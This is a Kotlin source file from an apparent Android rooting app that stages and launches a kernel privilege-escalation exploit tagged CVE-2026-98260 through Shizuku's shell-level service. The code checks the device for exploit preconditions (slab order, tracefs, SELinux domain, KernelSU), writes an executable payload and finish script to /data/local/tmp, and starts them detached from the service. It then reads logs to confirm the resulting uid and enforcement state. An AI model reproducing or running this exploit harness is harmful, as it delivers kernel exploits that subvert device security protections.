package com.ghostlock.app.backend.cve98260.service

import android.os.Process
import com.ghostlock.app.backend.cve98260.profile.Cve98260Params
import com.ghostlock.app.backend.cve98260.payload.Cve98260ExploitPayload
import com.ghostlock.app.backend.cve98260.payload.Cve98260LaunchScript
import com.ghostlock.app.backend.cve98260.profile.Cve98260ProfileException
import com.ghostlock.app.backend.cve98260.profile.Cve98260RunId
import com.ghostlock.app.core.victim.VictimCapabilities
import com.ghostlock.app.core.victim.VictimCapability
import com.ghostlock.app.core.victim.VictimResult
import com.ghostlock.app.core.victim.VictimScriptLauncher
import com.ghostlock.app.core.victim.VictimSessionConfig
import com.ghostlock.app.backend.cve98260.run.Cve98260ServicePort
import com.ghostlock.app.core.preflight.Cve98260Preflight
import com.ghostlock.app.jni.Native98260Jni
import java.io.File
import java.io.RandomAccessFile
import java.security.MessageDigest

/**
 * CVE-2026-98260 的 service 侧**幂等原语执行器**（B2）。
 *
 * 由**公用** `GhostlockUserService`（Shizuku UserService 进程，uid 2000 / shell 域）经 `Cve98260ShizukuHost` 调用。
 * 边界（ADR-0022/delta §2）：**不轮询、不判终态、不重试、不发信号**；只做
 * 预检/写 payload/journal/JNI spawn/日志读取/独立验证。run 状态唯一权威在 app Flow。
 *
 * 安全：任何路径不 kill/timeout/reap payload；`destroy()` 只清状态（进程由 Shizuku 约定退出）。
 * 路径固定 `/data/local/tmp/glk98260-*`（shell 域可写）；日志不含密钥。
 *
 * @note 真机门禁 G8/G9 未过；F9（app store）由 app Flow 在 prepare 前判定，本类不重复。
 */
internal class Cve98260RemoteExecutor {
    /** service 状态（与公用 host AIDL 的 backend 码同值）。 */
    private var state: Int = Cve98260ServicePort.State.IDLE
    private var params: Cve98260Params? = null
    private var pid: Int = 0
    private var lastReason: String = ""
    private var helperPath: String = ""
    private var finishRunId: String = ""
    private var finishScriptSha256: String = ""

    /** @return 当前状态码（AIDL State）。 */
    @Synchronized
    internal fun state(): Int = state

    /** @return 最近一次具名 reason（OK 时为空串）。 */
    @Synchronized
    internal fun lastReason(): String = lastReason

    /** @return payload pid（0=未启动）。 */
    @Synchronized
    internal fun payloadPid(): Int = pid

    /**
     * 预检 + 写 payload + journal installed。
     *
     * @param profileHex `Cve98260Profile.toParamArg()`。
     * @param payload payload 字节（≤1 MiB-64 KiB）。
     * @return [Cve98260ServicePort.Code]。
     */
    @Synchronized
    internal fun prepare(
        profileHex: String,
        payload: ByteArray,
        finishScript: ByteArray,
        runId: String,
        helperPath: String,
    ): Int {
        if (state != Cve98260ServicePort.State.IDLE) {
            lastReason = "cve98260:prepare:state:" + state
            return Cve98260ServicePort.Code.ERR_STATE
        }
        if (payload.isEmpty() || payload.size > Cve98260ExploitPayload.MAX_BYTES) {
            lastReason = "cve98260:prepare:payload-size:" + payload.size
            return Cve98260ServicePort.Code.ERR_ARGS
        }
        if (!Cve98260RunId.valid(runId)) {
            lastReason = "cve98260:prepare:run-id"
            return Cve98260ServicePort.Code.ERR_ARGS
        }
        if (finishScript.isEmpty() || finishScript.size > MAX_FINISH_SCRIPT_BYTES) {
            lastReason = "cve98260:prepare:finish-script-size:" + finishScript.size
            return Cve98260ServicePort.Code.ERR_ARGS
        }
        if (helperPath.isBlank() || !helperPath.startsWith("/data/")) {
            lastReason = "cve98260:prepare:helper-path:" + helperPath
            return Cve98260ServicePort.Code.ERR_ARGS
        }
        if (!File(helperPath).canExecute()) {
            lastReason = "cve98260:prepare:helper-not-executable:" + helperPath
            return Cve98260ServicePort.Code.ERR_PREFLIGHT
        }
        val decoded = try {
            Cve98260Params.decode(profileHex)
        } catch (problem: Cve98260ProfileException) {
            lastReason = problem.reason
            return Cve98260ServicePort.Code.ERR_ARGS
        }
        val facts = collectServiceFacts(decoded)
        val preflight = Cve98260Preflight.evaluateService(facts)
        if (!preflight.ok) {
            lastReason = preflight.reasons.joinToString(",")
            return Cve98260ServicePort.Code.ERR_PREFLIGHT
        }
        if (!stagePayload(payload)) {
            lastReason = "cve98260:prepare:stage"
            return Cve98260ServicePort.Code.ERR_STAGE
        }
        val stagedFinish = stageFinishScript(finishScript)
        if (stagedFinish == null) {
            lastReason = "cve98260:prepare:stage-finish"
            return Cve98260ServicePort.Code.ERR_STAGE
        }
        if (!writeJournal(outcome = JOURNAL_INSTALLED)) {
            lastReason = "cve98260:prepare:journal"
            return Cve98260ServicePort.Code.ERR_JOURNAL
        }
        params = decoded
        this.helperPath = helperPath
        finishRunId = runId
        finishScriptSha256 = stagedFinish
        lastReason = ""
        state = Cve98260ServicePort.State.PREPARED
        runCatching { Native98260Jni.logLine(2, "cve98260 prepare ok") }
        return Cve98260ServicePort.Code.OK
    }

    /**
     * 通过通用 victim 启动 payload（journal launched → victim launcher；payload 后台独立）。
     *
     * @return >0=pid；<0=具名负码（`-Code.*`）。
     */
    @Synchronized
    internal fun start(): Int {
        if (state == Cve98260ServicePort.State.RUNNING && pid > 0 && isProcessAlive(pid)) {
            return pid
        }
        val decoded = params
        if (state != Cve98260ServicePort.State.PREPARED || decoded == null) {
            lastReason = "cve98260:start:state:" + state
            return -Cve98260ServicePort.Code.ERR_STATE
        }
        if (!writeJournal(outcome = JOURNAL_LAUNCHED)) {
            lastReason = "cve98260:start:journal"
            return -Cve98260ServicePort.Code.ERR_JOURNAL
        }
        val script = Cve98260LaunchScript.render(
            payloadPath = Cve98260Paths.PAYLOAD_PATH,
            params = decoded.raw,
            finishScript = Cve98260Paths.FINISH_SCRIPT_PATH,
            runId = finishRunId,
            logPath = Cve98260Paths.LOG_PATH,
            pidPath = Cve98260Paths.PID_PATH,
        ).toByteArray(Charsets.UTF_8)
        val sessionConfig = VictimSessionConfig(
            helperPath = helperPath,
            helperArgv = listOf(helperPath.substringAfterLast('/')),
            helperEnv = emptyList(),
            capabilities = VictimCapabilities.of(
                VictimCapability.SPAWN_HELPER,
                VictimCapability.EXEC_SCRIPT,
                VictimCapability.BYE,
            ),
            rawSizeBytes = 64L * 1024L,
        )
        /* 公用 victim 脚本启动器：backend 只提供脚本/配置/pid 探针。 */
        val launched = VictimScriptLauncher().launch(
            config = sessionConfig,
            scriptPath = Cve98260Paths.LAUNCH_PATH,
            script = script,
            execTimeoutMs = VICTIM_EXEC_TIMEOUT_MS,
            onScriptDone = ::readLaunchedPid,
        )
        val spawned = when (launched) {
            is VictimResult.Ok -> launched.value
            is VictimResult.Failed -> {
                writeJournal(outcome = JOURNAL_UNKNOWN, failure = launched.reason)
                lastReason = launched.reason
                return -Cve98260ServicePort.Code.ERR_SPAWN
            }
        }
        pid = spawned
        if (!isProcessAlive(pid)) {
            writeJournal(outcome = JOURNAL_UNKNOWN, failure = "pid-not-alive:" + pid)
            lastReason = "cve98260:start:pid-not-alive:" + pid
            return -Cve98260ServicePort.Code.ERR_STATE
        }
        state = Cve98260ServicePort.State.RUNNING
        lastReason = ""
        runCatching { Native98260Jni.logLine(2, "cve98260 start pid=" + pid) }
        return pid
    }

    /**
     * 读取日志增量（只读；不删除/不轮转）。
     *
     * @param offset 已消费偏移（>=0）。
     * @param maxBytes 单次上限（1..64 KiB）。
     * @return 数据块；空=无新数据/文件不存在。
     */
    @Synchronized
    internal fun readLog(offset: Long, maxBytes: Int): ByteArray {
        if (offset < 0L || maxBytes <= 0 || maxBytes > MAX_LOG_CHUNK) return ByteArray(0)
        val file = File(Cve98260Paths.LOG_PATH)
        if (!file.isFile) return ByteArray(0)
        return runCatching {
            RandomAccessFile(file, "r").use { raf ->
                if (offset >= raf.length()) return@use ByteArray(0)
                raf.seek(offset)
                val length = minOf((raf.length() - offset).toInt(), maxBytes)
                val buffer = ByteArray(length)
                raf.readFully(buffer)
                buffer
            }
        }.getOrElse { ByteArray(0) }
    }

    /**
     * 独立验证事实（不判终态；返回 key=value 行）。
     *
     * @return UTF-8 证据行：`ksu_loaded=0/1`、`modules_readable=0/1`、`manager_lib=present/absent`、
     *   `boot_id=…`、`payload_pid=…`、`armed_hint=…`。
     */
    @Synchronized
    internal fun verify(): ByteArray {
        val modules = readTextFile(MODULES_PATH)
        val ksuLoaded = modules?.lineSequence()?.any { it.startsWith("kernelsu ") } ?: false
        val managerPresent = params?.let { findManagerLibksud(it.managerPackage) } ?: false
        val boot = readBootId()
        val logTail = readLogTail(LOG_TAIL_BYTES)
        val exitCode = LAST_EXIT_REGEX.find(logTail)?.groupValues?.get(1)
        val logUid = LAST_UID_REGEX.find(logTail)?.groupValues?.get(1)
        val logEnforce = LAST_ENFORCE_REGEX.find(logTail)?.groupValues?.get(1)
        val scriptFile = File(Cve98260Paths.FINISH_SCRIPT_PATH)
        val scriptSha = if (scriptFile.isFile) sha256File(scriptFile) ?: "" else ""
        val observedUid = logUid
        val enforceValue = logEnforce ?: readTextFile(Cve98260Paths.SELINUX_ENFORCE_PATH)?.trim()
        val lines = buildList {
            add("ksu_loaded=" + if (ksuLoaded) "1" else "0")
            add("modules_readable=" + if (modules != null) "1" else "0")
            add("manager_lib=" + if (managerPresent) "present" else "absent")
            add("boot_id=" + (boot ?: ""))
            add("payload_pid=" + pid)
            add("state=" + state)
            add("finish_script_present=" + if (scriptFile.isFile) "1" else "0")
            add("finish_script_sha256=" + scriptSha)
            add("finish_expected_sha256=" + finishScriptSha256)
            add("finish_exit=" + (exitCode ?: "unknown"))
            add("finish_timeout=0")
            add("finish_uid=" + (observedUid ?: "unknown"))
            add("finish_enforce=" + (enforceValue ?: "unknown"))
            add("finish_ksud=" + if (managerPresent || ksuLoaded) "1" else "0")
        }
        return lines.joinToString("\n").toByteArray(Charsets.UTF_8)
    }

    /** @return service 读到的 boot_id；失败空串。 */
    @Synchronized
    internal fun bootId(): String = readBootId() ?: ""

    /**
     * 只清 service 状态（**不 kill payload、不删 journal/日志**）。
     *
     * @note 由 Shizuku destroy 约定调用；payload 的存活由 POSIX_SPAWN_SETSID 保证。
     */
    @Synchronized
    internal fun destroy() {
        state = Cve98260ServicePort.State.TERMINAL
        lastReason = "cve98260:destroy"
    }

    /** 写 finish 脚本到 service 暂存路径（0700）。@return sha256 hex 或 null。 */
    private fun stageFinishScript(script: ByteArray): String? = runCatching {
        val target = File(Cve98260Paths.FINISH_SCRIPT_PATH)
        target.parentFile?.let { if (!it.isDirectory) return null }
        target.writeBytes(script)
        if (!target.setExecutable(true, false)) return null
        if (target.length() != script.size.toLong()) return null
        sha256Hex(script)
    }.getOrNull()

    /** @return 文件 sha256 hex；失败 null。 */
    private fun sha256File(file: File): String? = runCatching {
        sha256Hex(file.readBytes())
    }.getOrNull()

    /** @return sha256 hex；失败 null。 */
    private fun sha256Hex(bytes: ByteArray): String? = runCatching {
        MessageDigest.getInstance("SHA-256").digest(bytes)
            .joinToString("") { "%02x".format(it) }
    }.getOrNull()

    /** @return 日志尾部 ≤[maxBytes] 文本；失败空串。 */
    private fun readLogTail(maxBytes: Int): String = runCatching {
        val file = File(Cve98260Paths.LOG_PATH)
        if (!file.isFile) return ""
        RandomAccessFile(file, "r").use { raf ->
            val length = raf.length()
            val start = if (length > maxBytes) length - maxBytes else 0L
            raf.seek(start)
            val buffer = ByteArray((length - start).toInt())
            raf.readFully(buffer)
            String(buffer, Charsets.UTF_8)
        }
    }.getOrDefault("")

    /** @return 有界读取文件内容并 trim（≤128B）；不存在 null。 */
    private fun readBoundedTrim(path: String): String? = runCatching {
        val file = File(path)
        if (!file.isFile) return null
        if (file.length() > 128L) return null
        file.readText().trim().ifEmpty { null }
    }.getOrNull()

    /** 写 payload 文件（覆盖）并校验字节数 + chmod 0755。 */
    private fun stagePayload(payload: ByteArray): Boolean = runCatching {
        val target = File(Cve98260Paths.PAYLOAD_PATH)
        target.parentFile?.let { if (!it.isDirectory) return false }
        target.writeBytes(payload)
        if (!target.setExecutable(true, false)) return false
        target.length() == payload.size.toLong()
    }.getOrDefault(false)

    /** @return payload 文件 sha256（证据；失败空串）。 */
    internal fun payloadSha256(): String = runCatching {
        val digest = MessageDigest.getInstance("SHA-256")
        digest.digest(File(Cve98260Paths.PAYLOAD_PATH).readBytes()).joinToString("") { "%02x".format(it) }
    }.getOrDefault("")

    /**
     * 读启动脚本写下的 payload pid，并做 `/proc` 存活校验。
     *
     * @return pid（>0）或具名失败（不猜、不 kill）。
     */
    private fun readLaunchedPid(): VictimResult<Int> {
        val pid = runCatching { File(Cve98260Paths.PID_PATH).readText().trim().toIntOrNull() }.getOrNull()
            ?: return VictimResult.failed("cve98260-victim:pid-missing")
        if (pid <= 0) return VictimResult.failed("cve98260-victim:pid-invalid:" + pid)
        if (!isProcessAlive(pid)) return VictimResult.failed("cve98260-victim:pid-not-alive:" + pid)
        return VictimResult.Ok(pid)
    }

    /** 写 journal（tmp + rename 同目录原子替换）。 */
    private fun writeJournal(outcome: String, failure: String? = null): Boolean = runCatching {
        val boot = readBootId() ?: return false
        val content = boot + "|" + outcome + "|" + pid + "|" + System.currentTimeMillis() +
            "|" + (failure ?: "") + "\n"
        val tmp = File(Cve98260Paths.JOURNAL_PATH + ".tmp")
        tmp.writeText(content)
        tmp.renameTo(File(Cve98260Paths.JOURNAL_PATH))
    }.getOrDefault(false)

    /** 收集 service 侧预检事实（F1–F8/F10–F12；F9 由 app 判定后未在此重复）。 */
    private fun collectServiceFacts(decoded: Cve98260Params): Cve98260Preflight.ServiceFacts {
        val selfUid = Process.myUid()
        val selfDomain = readTextFile("/proc/self/attr/current")?.trim() ?: ""
        val tracefsWritable = File(TRACEFS_ON).canWrite()
        val slabOrderActual = readTextFile(SLAB_ORDER_PATH)?.trim()?.toLongOrNull()
        val pageSizeActual = android.system.Os.sysconf(android.system.OsConstants._SC_PAGESIZE)
        val cpuCount = Runtime.getRuntime().availableProcessors()
        val modules = readTextFile(MODULES_PATH)
        val ksuLoaded: Boolean? = modules?.lineSequence()?.any { it.startsWith("kernelsu ") }
        val boot = readBootId()
        val journal = readJournal()
        return Cve98260Preflight.ServiceFacts(
            selfUid = selfUid,
            selfDomain = selfDomain,
            tracefsWritable = tracefsWritable,
            slabOrderActual = slabOrderActual,
            slabOrderExpected = decoded.number(PARAM_SLAB_ORDER),
            pageSizeActual = pageSizeActual,
            pageSizeExpected = decoded.number(PARAM_PAGE_SIZE),
            cpuCount = cpuCount,
            cpuExpected = decoded.number(PARAM_CPU),
            ksuLoaded = ksuLoaded,
            managerLibksudPresent = findManagerLibksud(decoded.managerPackage),
            bootId = boot,
            journalState = journal.state,
            journalBootId = journal.bootId,
            currentBootId = boot,
            appStoreBlocked = false,
        )
    }

    /** journal 读取结果。 */
    private data class Journal(val state: Cve98260Preflight.JournalState, val bootId: String?)

    /** 读 journal；损坏/读失败按 READ_FAILED（阻止）。 */
    private fun readJournal(): Journal {
        val file = File(Cve98260Paths.JOURNAL_PATH)
        if (!file.isFile) return Journal(Cve98260Preflight.JournalState.ABSENT, null)
        val text = runCatching { file.readText().trim() }.getOrElse {
            return Journal(Cve98260Preflight.JournalState.READ_FAILED, null)
        }
        if (text.isEmpty()) return Journal(Cve98260Preflight.JournalState.READ_FAILED, null)
        val parts = text.split('|')
        if (parts.size < 2) return Journal(Cve98260Preflight.JournalState.READ_FAILED, null)
        val state = when (parts[1]) {
            JOURNAL_INSTALLED -> Cve98260Preflight.JournalState.INSTALLED
            JOURNAL_LAUNCHED -> Cve98260Preflight.JournalState.LAUNCHED
            JOURNAL_ARMED -> Cve98260Preflight.JournalState.ARMED
            else -> Cve98260Preflight.JournalState.UNKNOWN
        }
        return Journal(state, parts[0].ifEmpty { null })
    }

    /** @return true=当前 uid 下能找到 manager 的 `lib/arm64/libksud.so`（或 ksud 回退路径）。 */
    private fun findManagerLibksud(managerPackage: String): Boolean {
        val appDir = File("/data/app")
        val dirs = appDir.listFiles() ?: return false
        for (dir in dirs) {
            val packages = dir.listFiles() ?: continue
            for (pkgDir in packages) {
                if (!pkgDir.name.startsWith(managerPackage)) continue
                if (File(pkgDir, "lib/arm64/libksud.so").isFile) return true
            }
        }
        return ksudFallbackPresent()
    }

    /** @return true=profile 的 ksud 回退路径存在（未做 `--version` 执行）。 */
    private fun ksudFallbackPresent(): Boolean {
        val decoded = params ?: return false
        return decoded.ksudFallbacks.any { File(it).isFile }
    }

    /** @return 文本文件内容；失败 null。 */
    private fun readTextFile(path: String): String? =
        runCatching { File(path).readText() }.getOrNull()

    /** @return boot_id；失败 null。 */
    private fun readBootId(): String? = readTextFile(BOOT_ID_PATH)?.trim()?.ifEmpty { null }

    /** @return true=`/proc/<pid>/stat` 可读（不 kill）。 */
    private fun isProcessAlive(targetPid: Int): Boolean =
        targetPid > 0 && File("/proc/$targetPid/stat").isFile

    private companion object {
        private const val BOOT_ID_PATH = "/proc/sys/kernel/random/boot_id"
        private const val MODULES_PATH = "/proc/modules"
        private const val TRACEFS_ON = "/sys/kernel/tracing/tracing_on"
        private const val SLAB_ORDER_PATH = "/sys/kernel/slab/posix_timers_cache/order"
        private const val JOURNAL_INSTALLED = "installed"
        private const val JOURNAL_LAUNCHED = "launched"
        private const val JOURNAL_ARMED = "armed"
        private const val JOURNAL_UNKNOWN = "unknown"

        /** readLog 单次上限。 */
        private const val MAX_LOG_CHUNK = 64 * 1024

        /** UI 生成的 finish 脚本上限（binder 余量内）。 */
        private const val MAX_FINISH_SCRIPT_BYTES = 64 * 1024

        /** 启动脚本执行窗口（秒级；只约束脚本，不约束 payload）。 */
        private const val VICTIM_EXEC_TIMEOUT_MS = 5_000L

        /** 日志尾部解析窗口。 */
        private const val LOG_TAIL_BYTES = 64 * 1024

        private val LAST_EXIT_REGEX = Regex("GLK98260_FINISH_EXIT=(\\d+)")
        private val LAST_UID_REGEX = Regex("GLK98260_FINISH_UID=(-?\\d+)")
        private val LAST_ENFORCE_REGEX = Regex("GLK98260_FINISH_ENFORCE=(\\d+)")

        /* 参数下标（= params.h 顺序；只读用）。 */
        private const val PARAM_PAGE_SIZE = 1
        private const val PARAM_CPU = 2
        private const val PARAM_SLAB_ORDER = 4
    }
}
